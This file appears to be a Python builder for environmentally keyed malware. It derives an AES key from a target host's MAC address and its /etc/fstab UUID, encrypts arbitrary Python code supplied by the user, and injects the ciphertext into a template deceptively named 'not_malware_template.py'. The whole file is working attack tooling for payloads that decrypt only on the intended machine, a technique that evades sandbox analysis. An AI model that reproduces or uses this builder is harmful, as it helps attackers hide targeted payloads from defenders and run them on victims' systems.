from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import argparse
import sys

KEYSIZE = 32

def generate_payload(interface, payload):
	"Encrypt payload using a key derived from target's MAC address and UUID"
	macaddr_bytes = b""
	uuid_bytes = b""
	key = b""
	payload = bytes(payload, "utf-8")

	print("[*] Starting key generation")

	try:
		print("[*] Reading", f"/sys/class/net/{interface}/address")
		with open(f"/sys/class/net/{interface}/address", "rb") as f:
			macaddr_bytes = f.read(int(KEYSIZE / 2))
			print("[*] Got 16 bytes from MAC address:", macaddr_bytes)
	except Exception as error:
		print(f"[*] Couldn't open /sys/class/net/{interface}/address")
		sys.exit()

	print("[*] Reading /etc/fstab")

	with open("/etc/fstab", "rb") as f:
			line = f.readline()
			while line:
				if line[0:5] == b"UUID=":
					uuid_bytes = bytes(line.decode().split()[0].split("=")[1], "utf-8")
					uuid_bytes = uuid_bytes[:int(KEYSIZE / 2)] # only need first 16 bytes
					break
				else:
					line = f.readline()
					continue

	print("[*] Got 16 bytes from /etc/fstab UUID:", uuid_bytes)

	key = macaddr_bytes + uuid_bytes
	print("[*] Key:", key)
	cipher = AES.new(key, AES.MODE_CBC)
	iv = cipher.iv
	encrypted_payload = cipher.encrypt(pad(payload, AES.block_size))
	print("[*] Payload generated successfully\n")
	print("# Encrypted payload:", encrypted_payload, "\n")
	print("# AES IV:", iv, "\n")
	
	# Open bad.py and insert the payload and IV
	with open("not_malware_template.py", "r+") as f:
		original = f.read()

	new = original.replace("self.iv = None", f"self.iv = {iv}")
	new = new.replace("self.encrypted_payload = None", f"self.encrypted_payload = {encrypted_payload}")
	with open("not_malware_custom.py", "w") as f:
		f.write(new)

	print("[*] Payload written to custom_bad.py")

parser = argparse.ArgumentParser()
parser.add_argument("-p", dest="payload", help="payload (python code) to run")
parser.add_argument("-i", dest="interface", help="name of interface to use for generating key", required=True)
args = parser.parse_args()

if not args.payload:
	args.payload = 'print("PAYLOAD RUN!")'
generate_payload(args.interface, args.payload)
